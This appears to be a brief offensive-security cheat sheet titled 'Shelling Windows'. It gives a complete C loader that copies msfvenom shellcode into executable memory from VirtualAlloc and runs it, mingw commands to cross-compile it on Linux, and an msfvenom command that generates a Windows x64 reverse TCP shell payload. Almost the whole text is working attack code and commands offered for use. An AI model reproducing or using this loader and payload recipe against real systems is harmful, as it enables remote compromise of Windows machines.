# Shelling Windows
## C Code
```
#include <windows.h>
#include <stdio.h>

// Paste the msfvenom-generated shellcode here
unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52"
"...";  // Your full shellcode from msfvenom

int main() {
    // Allocate memory for the shellcode using VirtualAlloc
    void *exec_mem = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (exec_mem == NULL) {
        printf("Memory allocation failed\n");
        return -1;
    }

    // Copy shellcode to the allocated executable memory
    memcpy(exec_mem, shellcode, sizeof(shellcode));

    // Cast the allocated memory to a function pointer and execute it
    ((void(*)())exec_mem)();

    return 0;
}
```
## Compiling 
### Linux
1. Install mingw
```
sudo apt install mingw-w64
```
2. Compile it
```
x86_64-w64-mingw32-gcc win_basic_v01.c -o win_basic_v01.exe
```

## MSFvenom
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=9090 -f c
```
